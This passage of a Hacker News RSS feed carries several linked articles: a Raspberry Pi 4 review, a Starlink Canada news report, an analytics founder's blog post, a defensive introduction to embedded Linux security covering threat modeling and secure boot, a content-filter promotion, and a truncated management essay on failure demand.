<figure><a href="http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_PCB.jpg"><img src="http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_PCB-1024x651.jpg" alt="" srcset="http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_PCB-1024x651.jpg 1024w, http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_PCB-300x191.jpg 300w, http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_PCB-768x488.jpg 768w, http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_PCB-472x300.jpg 472w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Raspberry Pi 4 PCB (Broadcom BCM2711 and 4GB RAM)</figcaption></figure>



<p>I recommend upgrading to Raspberry Pi 4 without hesitation or reservations. I bought the Canakit PI4 Starter PRO Kit at Best Buy, not wanting to wait for delivery. The kit includes an RPi 4 with 4GB RAM, black plastic case, Canakit power supply, heat sinks, cooling fan, micro HDMI cable, USB card reader, NOOBS on a 32GB MicroSD card, and a Canakit power switch (PiSwitch). It seemed like the right combination of accessories. </p>



<blockquote><p>By the way, you might want to consider the newly announced Raspberry Pi 400. It integrates a Raspberry Pi 4 and keyboard into one very compact unit. Its price ($70USD) is hard to beat, too.</p></blockquote>



<p>The PiSwitch sits between the USB-C power supply and the RPi4, and is a convenient desktop power ON/OFF switch. Canakit could be a little more forthcoming about proper power up and power down sequencing. When powering down, I let the monitor go to sleep before turning power off. This should give the Raspberry Pi OS time to sync and properly shut-off.</p>



<p>I recommend checking the connecters on your monitor before placing any kind of web order. My HP monitor does not support HDMI, doing DisplayPort, DVI-D and VGA. The Canakit cable is micro-HDMI to HDMI. I bought a mini-HDMI to DVI-D cable on-line and wound up waiting after all! No way I’m paying Best Buy prices for a cable. 🙂</p>



<p>Assembly is a piece of cake. The processor and case fit together without screws or other hardware. The case fit and finish is good and holds together well just by fit alone. I installed the heat sinks, but not the fan. If I run into thermal issues, I will add the fan.</p>



<p>I didn’t bother with the NOOBS MicroSD card as I already had Buster installed. I see the value in NOOBS for beginners who don’t want to deal with disk images and such. I will probably repurpose the NOOBS card.</p>



<p>The only annoyance is due to the Raspberry Pi OS package manager. The add/remove software interface shows waaaaay too much detail. I want to install CubicSDR and GQRX, but where the heck are they? Why do I have to sort through a zillion libraries, etc. when searching on “SDR”? I installed via command line apt-get — a far more convenient and direct method.</p>



<p>The higher processor speed and bigger RAM pay off — no more glitchy audio. After trying both CubicSDR and GQRX, I prefer CubicSDR. I didn’t have any issues configuring for HF reception in either case. You should read the documentation (!) ahead of time, however. </p>



<p>I hope this quick Raspberry Pi 4 rundown is helpful.</p>



<p>Copyright © 2020 Paul J. Drongowski</p>
			</div></div>]]>
            </description>
            <link>http://sandsoftwaresound.net/raspberry-pi-4-mini-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015925</guid>
            <pubDate>Sat, 07 Nov 2020 16:19:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elon Musk's SpaceX closer to launching Starlink satellite internet in Canada]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25015892">thread link</a>) | @ranit
<br/>
November 7, 2020 | https://www.ctvnews.ca/sci-tech/elon-musk-s-spacex-closer-to-launching-starlink-satellite-internet-in-canada-1.5178392 | <a href="https://web.archive.org/web/*/https://www.ctvnews.ca/sci-tech/elon-musk-s-spacex-closer-to-launching-starlink-satellite-internet-in-canada-1.5178392">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>OTTAWA -- 
	Aerospace firm SpaceX has been granted a second round of government approval to provide high-speed internet to Canadians through a constellation of satellites.</p>
<p>
	Innovation, Science and Economic Development Canada said on Friday it approved SpaceX's Starlink program, which aims to offer broadband internet in areas where connections tend to be unreliable, expensive, or completely unavailable.</p>
<p>
	"Our government recognizes that high-speed Internet access is no longer a luxury -- it is essential," said Minister of Innovation, Science and Industry Navdeep Bains of the project's approval.</p>
<p>
	"The COVID-19 pandemic has highlighted how much we all rely on digital connections. Now more than ever, Canadians are working, learning and communicating with friends and family from home."</p>
<p>
	ISED's signoff comes after the Canadian Radio-television and Telecommunications Commission granted its license in mid-October. The company's website says it is targeting a 2020 launch for services in the northern U.S. and Canada.</p>
<p>
	After being asked when Canadians can try the service, SpaceX CEO Elon Musk tweeted on Nov. 5 that he was just "awaiting approval from Canadian authorities." SpaceX has said it will dim the brightness of the low-earth satellites to avoid light pollution after some Canadians raise the concern during the CRTC approval process.</p>
<p>
	"This regulatory approval will allow them to begin using their Starlink Constellation to provide high speed internet connectivity to rural and remote communities in Canada," Bains said in a statement.</p>
<p>
	SpaceX's website says the project is "still in its early stages" and undergoing tests. But the start of the COVID-19 pandemic, Washington state's Department of Commerce said it tried the service with Hoh Tribe members, and residents of the reservation were able to use it to attend telehealth appointments and virtual learning sessions.</p>
<p>
	Over 2,500 comments on SpaceX's endeavor were submitted to the CRTC, many highlighting the need for better internet service in their areas.</p>
<p>
	Kenneth Flack, a councillor for the municipality of Pointe Fortune, Que. said he is hoping the project will help those most disadvantaged in rural communities.</p>
<p>
	Lack of connectivity there "severely" limited the ability of children, businesses and isolated seniors to connect during the height of COVID-19 isolation recommendations, Flack wrote to the CRTC in May.</p>
<p>
	"I have been working from home for months now with extremely limited internet and extremely high bills for low quality service. There are no options for me from any current Canadian telecom," Steven Sauve, chief product officer of ASAPP Financial Technology Inc. in Richards Landing, Ont, wrote to regulators.</p>
<p>
	"It is important to allow this entry into the market so underserviced areas have a viable option."</p>
<p>
	Last year, SpaceX also worked with the Canadian Space Agency on a separate project to launch its Earth-observation satellites, called the RADARSAT Constellation.<br>
	&nbsp;</p>
<div data-attribute="embed_code">
<!--startPolopolyEmbed-->	<blockquote>
		<p dir="ltr" lang="en">
			Awaiting approval from Canadian authorities</p>
		— Elon Musk (@elonmusk) <a href="https://twitter.com/elonmusk/status/1324481509475020800?ref_src=twsrc%5Etfw">November 5, 2020</a></blockquote>
<!--endPolopolyEmbed--></div>
                                              </div></div>]]>
            </description>
            <link>https://www.ctvnews.ca/sci-tech/elon-musk-s-spacex-closer-to-launching-starlink-satellite-internet-in-canada-1.5178392</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015892</guid>
            <pubDate>Sat, 07 Nov 2020 16:14:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I’m building yet another analytics tool]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25015885">thread link</a>) | @amzans
<br/>
November 7, 2020 | https://panelbear.com/blog/why-panelbear/ | <a href="https://web.archive.org/web/*/https://panelbear.com/blog/why-panelbear/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Panelbear grew out of a side-project of mine as I didn't feel at home in any of the existing analytics solutions. I wanted the power and flexibility of a complete toolkit, without complicated dashboards or invading the privacy of my visitors.</p><p>They say “data is the new gold”, and data is what fuels any analytics tool out there. My aim is to build a complete toolkit that puts your website’s data to work for you and not for the mega corporations. Panelbear aims to become the hub for your analytics, giving you automated insights and the features growing businesses need, while remaining private by design.</p><h2>Privacy by design</h2><p>I found it unnecessarily time consuming to keep up with the nightmare of cookie banners, legal notices, and keeping records of consent, when all I really wanted was to understand how my website is being used. Tools like Google Analytics are powerful but you’re giving up the personal data of your visitors and one your most valuable assets: your website’s data.</p><p>My tools should respect the privacy of my visitors by design, and it shouldn't depend on me checking the right boxes in some obscure UI or following lengthy manuals. Unfortunately, keeping up with privacy regulations is almost a full time job, and for small business owners this creates a huge disadvantage.</p><p>The principles of privacy are fantastic, but we won’t enjoy the widespread benefits unless they’re simple enough to follow and do not “dumb down” the tools that bring a lot of value to our businesses.</p><h2>Use your time for something meaningful</h2><p>Joe Armstrong once said: "You wanted a banana but what you got was a gorilla holding the banana and the entire jungle". As a small business owner, this is exactly how it feels like to keep up with the ever-changing privacy regulations.</p><p>You see, if you own a website, you probably need to have visibility into what’s going on to be able to improve it over time. Things like:</p><ul><li>How many visitors come each day?</li><li>Which pages are trending?</li><li>What are the top countries?</li><li>How fast is my site loading in each country?</li></ul><p>At this point, you are probably thinking of using something like Google Analytics, but then you have to worry about ensuring your setup is fully compliant with privacy regulations like GDPR, or things like the transfer of personal data between EU-US. Fines are pretty big even for small websites, not to mention that many of these tools invade the privacy of your visitors, and may even sell your data to third-parties. Have you heard of the phrase: "if you're not paying for the product, you are the product"?</p><p>Soon you find yourself in a nightmare of using various third-parties for things like cookie banners, keeping records of consent and a complicated setup when all you really wanted was to understand how your website is being used, not to track the personal data of your visitors and fuel the already huge corporations that possess them.</p><p>So after trying out most privacy-friendly solutions out there, I never felt at home with them. They were doing either too little, or too much for my needs. Having worked for several years building large-scale infrastructure for one of Europe’s largest search platforms, I decided to take the challenge and started building Panelbear on the weekends next to my full-time job.</p><h2>Getting better all the time</h2><p>There’s plenty of other analytics services out there, and while Panelbear offers similar features, the aim is to become a more complete toolset for your website, one new feature at a time.</p><p>Many of the alternatives focus on being simplified versions of Google Analytics, and I respect them, you as a customer have more options now than ever. But there’s more features that I’d like to have as part of my toolset, and I would prefer to not require five different services to get each feature (such as performance metrics). For example, here are some ideas I've been bouncing around with early customers:</p><ul><li>Automated insights (for example "Your signup page has a higher bounce rate than normal this week" or "Visitors coming from Twitter spend 50% more time on your website.").</li><li>Performance metrics (such as time to first paint and Apdex scores).</li><li>Privacy-friendly link shortening with statistics.</li></ul><p>If you own a Panelbear account, you probably noticed that every single week there’s a new feature or improvement that makes your life easier as a website owner. It’s getting better all the time, and we’re just getting started.</p><h2>How can it be free and private?</h2><p>Panelbear offers a very generous free plan which includes 10,000 pageviews per month for unlimited websites. For my full-time job I work together with teams that build large scale multi-regional infrastructure, and this helped me understand and optimize the technical and operational aspects of Panelbear to the point that sustaining a free plan became possible.</p><p>What’s in it for Panelbear? My strategy is a simple one: if I deliver a ton of value in a simple package, it would help me get the word out, and eventually this may translate into customers with larger websites getting to know my product and subscribing to a paid plan that supports the business. It’s really that simple, and there’s no ulterior motive.</p><h2>What’s in it for you?</h2><p>It’s super encouraging that many of Panelbear's customers have reached out on Twitter or via email to share their support. Some of the things they appreciate are:</p><ul><li>Super simple setup</li><li>No cookie notice needed</li><li>Really fast dashboards</li><li>Site speed metrics</li><li>Simple pricing, flexible upgrades</li><li>Friendly support - at least that’s what I’m told :)</li></ul><p>Regarding pricing based on usage: there are no hidden fees or charges for traffic spikes if your site suddenly becomes popular. Panelbear is a small business too, so I understand that you need flexibility as well. You simply book the volume you predict you will need and we can adjust it as you go.</p><p>I feel incredibly lucky, just launched the early-access program last September with a few posts here and there, and Panelbear is already handling millions of page views per month for various websites. It’s been a crazy ride so far!</p><p>I'm happy to answer your questions, feel free to say hi via email at <a href="https://panelbear.com/cdn-cgi/l/email-protection#14757a607c7b7a6d5464757a7178767175663a777b79"><span data-cfemail="e2838c968a8d8c9ba292838c878e80878390cc818d8f">[email&nbsp;protected]</span></a> or you can DM me on twitter if you prefer: <a href="https://twitter.com/anthonynsimon">@anthonynsimon</a></p></div></div></div>]]>
            </description>
            <link>https://panelbear.com/blog/why-panelbear/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015885</guid>
            <pubDate>Sat, 07 Nov 2020 16:14:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn how to design and defend an embedded Linux device]]>
            </title>
            <description>
<![CDATA[
Score 127 | Comments 34 (<a href="https://news.ycombinator.com/item?id=25015821">thread link</a>) | @sprado
<br/>
November 7, 2020 | https://embeddedbits.org/introduction-embedded-linux-security-part-1/ | <a href="https://web.archive.org/web/*/https://embeddedbits.org/introduction-embedded-linux-security-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    <div>
      <article role="main">
        <p>This article is going to be an introduction to <strong>embedded Linux security</strong>.</p>
<p>Since this topic is quite extensive, I divided into two parts. In this first part, we will have a small introduction to security concepts and threat modeling and then focus on some mitigation techniques to improve the security of an embedded Linux device, including secure boot, code/data encryption and secure key storage.</p>
<p>If you prefer a one hour talk instead of reading this article, you can also watch the webinar <a href="https://www.youtube.com/watch?v=QcUKAgVKSxQ">“Introduction to embedded Linux security”</a> I recorded for <a href="https://www.toradex.com/">Toradex</a>. I also gave the same talk at Embedded Linux Conference North America 2020, but as I write this article it was not yet published on YouTube.</p>
<p>Let’s first start with some concepts…</p>
<h2 id="security-concepts">Security concepts</h2>
<p>Security is all about risk mitigation.</p>
<p>On the one hand, we have <strong>owners</strong>, those who benefit from a product or service (user, manufacturer, business owner, etc). And owners want to protect <strong>assets</strong>, anything that has some value in the product or service (data, code, reputation, etc).</p>
<p>On the other hand, we have <strong>threat actors</strong>, a person or thing (malicious hacker, government, etc) that can manifest a <strong>threat</strong>, anything that is capable of acting against an asset in a manner that can result in harm.</p>
<p>To manifest a threat, the threat actor will explore <strong>vulnerabilities</strong> (weakness in the system) via an <strong>attack vector</strong>, a method or pathway used by the threat actor to access or penetrate the target system.</p>
<p>The diagram below express very well all those concepts:</p>
<p><a href="https://www.enisa.europa.eu/publications/hardware-threat-landscape/at_download/fullReport"><img src="https://embeddedbits.org/images/20200906-security-concepts.png" alt="Security Concepts"></a></p>
<p>In the end, is a cat-and-mouse game between owners and threat actors. How far will the owner go to protect the assets? How far will the threat actor go to compromise the assets? It really depends on the value of the assets. Indeed, the perception of value may not be the same for owners and threat actors.</p>
<p>Identifying assets (and their value) to mitigate the risks of being compromised can be done in a process called <strong>threat modeling</strong>.</p>
<h2 id="threat-modeling">Threat modeling</h2>
<p>Threat modeling is a process where potential threats can be identified, enumerated, and mitigations can be prioritized. It is basically a risk assessment process where you evaluate the value of your assets and the cost to protect them. The result of a threat modeling is the <strong>threat model</strong> of your product.</p>
<p><img src="https://embeddedbits.org/images/20200906-threat-modeling.png" alt="Threat modeling"></p>
<p>There are several techniques and methodologies that can help during threat modeling, including STRIDE, DREAD, VAST, OCTAVE, and many others.</p>
<p>To have a very basic introduction to the topic, let’s talk about STRIDE and DREAD.</p>
<p>The <a href="https://en.wikipedia.org/wiki/STRIDE_(security)">STRIDE model</a> is a very useful tool to help classify threats. It was developed by Microsoft and the name is an acronym for the six main types of threats: <strong>S</strong>poofing, <strong>T</strong>ampering, <strong>R</strong>epudiation, <strong>I</strong>nformation disclosure, <strong>D</strong>enial of service and <strong>E</strong>scalation of privileges. STRIDE can be used to identify all threats the assets of a system could be exposed to.</p>
<p><a href="https://allabouttesting.org/stride-acronym-of-threat-modeling-system/"><img src="https://embeddedbits.org/images/20200906-stride.png" alt="STRIDE"></a></p>
<p>The <a href="https://en.wikipedia.org/wiki/DREAD_(risk_assessment_model)">DREAD methodology</a> is a tool for risk-assessing computer security threats. The name is an acronym for five categories of security threats: <strong>D</strong>amage (how bad would an attack be), <strong>R</strong>eproducibility (how easy is it to reproduce the attack), <strong>E</strong>xploitability (how much work is it to launch the attack), <strong>A</strong>ffected users (how many people would be impacted) and <strong>D</strong>iscoverability (how easy is it to discover the threat).</p>
<p><a href="https://www.slideshare.net/SecurityInnovation/threat-modeling-to-reduce-software-security-risk"><img src="https://embeddedbits.org/images/20200906-dread.png" alt="DREAD"></a></p>
<p>While the STRIDE model helps to identify the threats, the DREAD methodology helps to rank them. For each threat in the system, you would go over each threat category and classify it in low (1 point), medium (2 points), or high (3 points). In the end, you would have a ranked list of threats and mitigation strategies. Example:</p>
<p><img src="https://embeddedbits.org/images/20200906-threat-modeling-example.png" alt="Threat modeling example"></p>
<p>We can see that threat modeling will provide a very clear view of what we want to protect, how we plan to protect it, and associated costs. This is part of the <strong>threat model</strong> of the product, which needs to be re-evaluated for every development cycle. As a result, the threat model will provide a prioritized list of threats to work on, so we can focus on implementing the mitigations to improve the security of the product.</p>
<p>How to protect the integrity and authenticity of your code? How to ensure the privacy of the data? Where to store cryptographic keys? How to minimize the risks of an application to be exploited? Let’s try to answer all of those questions and many more, starting with secure boot!</p>
<h2 id="secure-boot">Secure Boot</h2>
<p>How to make sure the code you are running was built by a trustworthy person or company? Implementing a <strong>secure boot</strong> process.</p>
<p>The objective of a secure boot process is to protect the integrity and authenticity of the code.</p>
<p>Secure boot is usually based on the verification of digital signatures. An embedded Linux system normally has three major components: bootloader, kernel and root filesystem (rootfs). All these components are signed and the signatures are checked during boot.</p>
<p>For example, some hardware mechanism can be used to check the signature of the bootloader, that will check the signature of the kernel, that will use a ramdisk image to check the signature of the root filesystem. Since we have one component checking the signature of the next one in the boot chain, this process is often called a <strong>chain-of-trust</strong>.</p>
<p><img src="https://embeddedbits.org/images/20200906-secure-boot-1.png" alt="Secure boot"></p>
<p>Let’s take a look at a real example on an <a href="https://www.nxp.com/imx6">NXP iMX6</a> device.</p>
<p>Everything starts in the ROM code inside the SoC. On NXP iMX6, there is a hardware component called High Assurance Boot (HAB) that it is able to validate the signature of the first stage bootloader, making it possible to implement a secure boot process. The High Assurance Boot inside iMX6 devices can also be called the <strong>Root of Trust</strong>, since if it is compromised, all the secure boot process is also compromised.</p>
<p>The ROM code inside the iMX6 SoC, using the HAB component, will check the signature of the bootloader. For that, it is necessary to generate a pair of keys (public and private), sign the bootloader with the private key and store the public key inside the SoC. On iMX6, OTP fuses are used to store the keys. Actually, to make it less expensive, only the hash of the public key is stored in the SoC.</p>
<p>When the bootloader boots (e.g. <a href="https://www.denx.de/wiki/U-Boot">U-Boot</a>), it will have to check the signature of the Linux kernel. For that, it is common to use an image format called <strong>FIT image</strong>. The FIT image is a container for multiple binaries with hashing and signature support, and usually contains the Linux kernel image, device tree files and an initial ramdisk. After generating a pair of keys, we need to sign the binaries inside the FIT image with the private key e configure U-Boot to use the public key to check the signature of the FIT image.</p>
<p>After the kernel boots, it will run the <em>init</em> program from the ramdisk image. The ramdisk will have the logic to verify the integrity of the final root filesystem before mounting it. There are some options to implement this. One common option is using the device-mapper verity (<a href="https://www.kernel.org/doc/html/latest/admin-guide/device-mapper/verity.html">dm-verity</a>) kernel module. The <strong>dm-verity</strong> kernel module provides integrity checking of block devices and requires a read-only rootfs (squashfs can be a good solution). Other approaches would be <a href="https://wiki.gentoo.org/wiki/Integrity_Measurement_Architecture">IMA</a> or <a href="https://www.kernel.org/doc/html/latest/admin-guide/device-mapper/dm-integrity.html">dm-integrity</a> if you want a read-write root filesystem.</p>
<p>Here is a diagram of the complete secure boot process:</p>
<p><img src="https://embeddedbits.org/images/20200906-secure-boot-2.png" alt="Secure boot on NXP iMX6"></p>
<p>This is only one example of a secure boot implementation, although it could be applied to a different set of boards and ARM SoCs.</p>
<p>Yet nothing is 100% secure!</p>
<p>Secure boot vulnerabilities in the ROM code of several NXP devices (i.MX6, i.MX50, i.MX53, i.MX7, i.MX28 and Vybrid families) were <a href="https://blog.quarkslab.com/vulnerabilities-in-high-assurance-boot-of-nxp-imx-microprocessors.html">publicly disclosed</a> on July 17th, 2017. And if your chain of trust is compromised, everything is compromised! So we need to be aware of these types of vulnerabilities (in this case, they were fixed with new silicon).</p>
<p>While secure boot ensures authenticity and integrity, it does not protect the device from being counterfeited or threat actors from extracting code/data from the device. So if you want to protect your intellectual property or ensure data confidentiality, you will need to use encryption.</p>
<h2 id="code-and-data-encryption">Code and data encryption</h2>
<p>You may want to encrypt data or code in an embedded Linux device.</p>
<p>Data encryption is a common approach when you need to protect the privacy and confidentiality of the users. Data is any information generated during the executing of the device, including databases, configuration files, and so on.</p>
<p>Code encryption depends on the situation, and encrypting the full root filesystem is not that common. Usually, most of the components are free and open source software, so there is nothing to hide. There is also the issue of GPLv3 and Tivoization (using any GPLv3 software will force you to provide a mechanism for the user to update the software, and that would make it more difficult if you are encrypting it). A more common use case is to encrypt only the applications you developed for the device. It’s usually where your intellectual property is.</p>
<p>There are basically two main approaches to encryption in Linux: <strong>full disk encryption</strong> and <strong>file-based encryption</strong>.</p>
<p>Full disk encryption provides encryption at the block level and the whole disk or a disk partition is encrypted. For that, we can use <a href="https://en.wikipedia.org/wiki/Dm-crypt">dm-crypt</a>, the Linux kernel’s device mapper crypto target.</p>
<p>File-based encryption provides encryption at the file system level, where each directory may be separately and optionally encrypted with a different key. The two most common implementations of file-based encryption are <a href="https://wiki.archlinux.org/index.php/Fscrypt">fscrypt</a> and <a href="https://wiki.archlinux.org/index.php/ECryptfs">eCryptFS</a>. fscrypt is an API available on some filesystems like EXT4, UBIFS and F2FS, and eCryptFS is a more generic solution implemented as a layer that stacks on top of an existing filesystem.</p>
<p>But what about the keys used for encryption?</p>
<h2 id="encryption-keys">Encryption keys</h2>
<p>Since an asymmetric key algorithm is too slow to be used in encryption, usually a symmetric-key algorithm is used in encryption. That means the same key is used for encryption and decryption, and the key should be available somewhere in the filesystem so the encrypted code/data can be decrypted.</p>
<p>But we can’t just leave the key lying around in the filesystem, right?</p>
<p>There are several cases where companies …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://embeddedbits.org/introduction-embedded-linux-security-part-1/">https://embeddedbits.org/introduction-embedded-linux-security-part-1/</a></em></p>]]>
            </description>
            <link>https://embeddedbits.org/introduction-embedded-linux-security-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015821</guid>
            <pubDate>Sat, 07 Nov 2020 16:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Necessity of an Intelligent Content Filter]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25015526">thread link</a>) | @bromquinn
<br/>
November 7, 2020 | https://getontopic.com/blog/article/the-necessity-of-an-intelligent-content-filter.html | <a href="https://web.archive.org/web/*/https://getontopic.com/blog/article/the-necessity-of-an-intelligent-content-filter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <h3 id="our-attention-is-under-attack"><a href="#our-attention-is-under-attack">#</a> Our Attention is Under Attack</h3> <p>The modern internet is becoming increasingly distracting.  Digital distractions are very different from the distractions humans have faced for most of our existence.   The human brain can handle coming across an interesting looking rock, or stopping to marvel at a brilliant sunset.  But digital distractions are different.  Digital distractions are distracting by design, and they are designed well.  Big tech employs hundreds of thousands of highly paid, highly intelligent people who spend all day figuring out how to steal our attention.  The more distracted we get, the more money they make.</p> <p>Every day, there is a well funded, highly coordinated attack on our attention.  But most people claim that we can defeat these attacks by ignoring the distractions and just being "disciplined".  This is as absurd as claiming “I'm smart, so marketing doesn’t work on me”.  As Peter Thiel says about marketing in Zero to One:</p> <blockquote><p>“Anyone who can’t acknowledge its likely effect on herself is doubly deceived.”</p></blockquote> <h3 id="one-month-of-wasted-time-per-year"><a href="#one-month-of-wasted-time-per-year">#</a> One month of wasted time per year</h3> <p>But how much of an impact can distractions really have?  According to some <a href="https://www.themuse.com/advice/this-is-nuts-it-takes-nearly-30-minutes-to-refocus-after-you-get-distracted" target="_blank" rel="noopener noreferrer">research<span> <span>(opens new window)</span></span></a>, it takes our brains an average of 23 minutes to refocus after a distraction.  So if you’re distracted once per hour, 8 hours per day, 5 days per week, that adds up to 23 x 8 x 5 x 52 =  47,840 minutes per year, or just over one month of lost time per year.</p> <h3 id="why-don-t-we-block-distracting-sites"><a href="#why-don-t-we-block-distracting-sites">#</a> Why don’t we block distracting sites?</h3> <p>If only it were that simple.  The modern internet is facing record breaking levels of "content inequality".  The top 1% of websites host 99% of the content.  All videos are on YouTube.  Discussions that used to take place on niche forums now take place on Reddit or Discord.  Gone are the days of personal websites, and here are the days of Facebook, Instagram, Twitter and TikTok.</p> <p>Distracted students and professionals can’t simply block YouTube and Reddit, because the useful information we need to do our jobs and succeed in our studies lives on these sites - right along-side the distractions.</p> <h3 id="inspiration-strikes"><a href="#inspiration-strikes">#</a> Inspiration Strikes</h3> <p>When I was in grad school, I was lucky if I could make it through 10 minutes of Stanford Computer Science lectures before starting to watch Key and Peele.</p> <p>This situation was the inspiration that led me to create <a href="https://getontopic.com/" target="_blank" rel="noopener noreferrer">On Topic<span> <span>(opens new window)</span></span></a>.  I needed a way to be able to watch and read content related to my classes on YouTube and Reddit, without wasting time on distracting content on those same sites.</p> <p>I tried almost every content blocker out there:
Freedom, LeechBlock, ColdTurkey, uBlock Origin and none of them cut it.  Most of them simply blacklist certain ‘distracting’ domains.  None of them were intelligent enough to allow me to view YouTube videos about Computer Science, while stopping me from watching Chapelle’s Show.</p> <h3 id="on-topic-is-truly-different"><a href="#on-topic-is-truly-different">#</a> On Topic is truly different.</h3> <p>You tell On Topic what you need to focus on, and as you browse the internet its AI analyzes the contents of each page you view. If a page is irrelevant to your area of focus, it gets blocked!</p> <p>The battle for our attention is ongoing, but I truly believe that On Topic can be a useful ally for anyone committed to taking ownership of their time and attention.</p> <p>If you're one of those people, I'd be honored if you tried it out.</p> <p><a href="https://getontopic.com/" target="_blank" rel="noopener noreferrer">Try On Topic<span> <span>(opens new window)</span></span></a></p></div></div>]]>
            </description>
            <link>https://getontopic.com/blog/article/the-necessity-of-an-intelligent-content-filter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015526</guid>
            <pubDate>Sat, 07 Nov 2020 15:18:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Failure Demand]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25015475">thread link</a>) | @mooreds
<br/>
November 7, 2020 | https://vanguard-method.net/failure-demand/ | <a href="https://web.archive.org/web/*/https://vanguard-method.net/failure-demand/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<p><span>The concept of failure demand was first described by John Seddon in his book “</span><span>I Want You to Cheat”, published in 1992. It was initially called </span><span>“demand we don’t want” and later, after much careful thought, re-named “failure demand”. </span><span>Since then, it has become widely known by people who work in service organisations. But do they understand it and do they know what to do about it?</span></p>
<h4><b>What is Failure Demand?</b></h4>
<p><span>It is </span><i><span>demand caused by a failure to do something or do something right for the customer.</span></i><span> Customers come back, making further demands, unnecessarily consuming the organisation’s resources because the service they receive is ineffective.&nbsp;</span></p>
<p><span>In order to understand demand:</span></p>
<ul>
<li>Note how it is defined in customer terms.</li>
<li><span>Imagine what service would be like if every customer got whatever they needed… Seddon sets a high bar.</span></li>
</ul>
<p><span>Failure demand stands in contrast to value demand. The latter consists of customer requests that are a normal part of providing a service.</span></p>
<p><img loading="lazy" title="Failure demand" src="https://i2.wp.com/vanguard-method.net/wp-content/uploads/2019/10/Failure-demand.png?resize=570%2C204&amp;ssl=1" alt="Failure demand" width="570" height="204" srcset="https://i2.wp.com/vanguard-method.net/wp-content/uploads/2019/10/Failure-demand.png?w=570&amp;ssl=1 570w, https://i2.wp.com/vanguard-method.net/wp-content/uploads/2019/10/Failure-demand.png?resize=300%2C107&amp;ssl=1 300w" sizes="(max-width: 570px) 100vw, 570px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/vanguard-method.net/wp-content/uploads/2019/10/Failure-demand.png?w=570&amp;ssl=1 570w, https://i2.wp.com/vanguard-method.net/wp-content/uploads/2019/10/Failure-demand.png?resize=300%2C107&amp;ssl=1 300w" data-lazy-src="https://i2.wp.com/vanguard-method.net/wp-content/uploads/2019/10/Failure-demand.png?resize=570%2C204&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p><span>In conventional command-and-control service organisations, failure demand routinely runs at 40 – 60% of total customer demand. In some organisations, particularly health and social care and utilities, it can be as high as 80% or more. It is astonishing burden on capacity and an astonishing cost.</span></p>
<h4><b>Failure Demand Analysis</b></h4>
<p><span>To find out how much failure demand there is you need to study: What demands, in their terms, do customers make? How many of these are caused by failure to do something or do something right?&nbsp;</span></p>
<p><span>Some tips:</span></p>
<ul>
<li><span>Study demand as it arises, at the points where your customers transact with your organisation. Do not translate the demand into an internal definition, record exactly what the customer says/writes.</span></li>
<li><span>Classify demands in customer terms, develop a customer typology. What types of demand and with what frequency? How predictable is each type?</span></li>
<li><span>What proportions are value demand and failure demand?</span></li>
</ul>
<p><span>Identifying failure demand is the easy task. Reducing and removing it is the more difficult part. Command-and-control thinkers assume that the problem is caused by failures of people and processes. But tinkering about with those won’t achieve much, because failure demand is systemic. To remove it, you have to change the system; to even contemplate that, a significant shift in management thinking is necessary.</span></p>
<h4><b>How to Remove Failure Demand</b></h4>
<p><span>The only solution is to redesign the organisation. To design it as a system whose purpose is to achieve each and every customer’s purpose, articulated and measured in customer terms. It means:</span></p>
<ul>
<li><span>Rethinking all organisation controls</span></li>
<li><span>Designing services from the outside-in</span></li>
<li><span>Redefining job roles, including managerial roles</span></li>
</ul>
<p><span>An overhaul of the entire organisation is required – front line services and supporting functions.&nbsp;</span></p>
<p><span>Following the redesign, not only will you provide a better service and have happier customers, but you will reduce the cost of delivering the service. It is not uncommon to reduce costs by as much as 50%. The increase in capacity can now be spent in more productive ways, to drive growth.&nbsp;</span></p>
<table>
<tbody>
<tr>
<td><b><i>Dos&nbsp;</i></b></td>
<td><b><i>Don’ts</i></b></td>
</tr>
<tr>
<td><span>Value management</span></td>
<td><span>Activity management</span></td>
</tr>
<tr>
<td><span>Design against demand</span></td>
<td><span>Specialisation of work</span></td>
</tr>
<tr>
<td><span>Measure actual times</span></td>
<td><span>Impose standard times</span></td>
</tr>
<tr>
<td><span>Design to absorb variety</span></td>
<td><span>Standardise work</span></td>
</tr>
<tr>
<td><span>Derive measures from customers’ purpose</span></td>
<td><span>Derive measures from budget</span></td>
</tr>
<tr>
<td><span>Decision-making integrated with work</span></td>
